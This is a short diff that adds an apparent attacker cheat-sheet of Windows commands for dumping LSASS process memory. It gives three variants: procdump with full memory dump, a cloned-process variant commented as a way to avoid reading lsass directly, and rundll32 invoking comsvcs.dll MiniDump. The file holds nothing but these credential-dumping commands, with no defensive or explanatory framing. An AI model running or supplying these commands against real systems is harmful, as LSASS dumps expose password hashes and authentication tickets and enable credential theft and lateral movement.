@@ -1,0 +1,8 @@
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+// or avoid reading lsass by dumping a cloned lsass process
+procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
+
+
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump {pid-lsass-process} {path} full
+
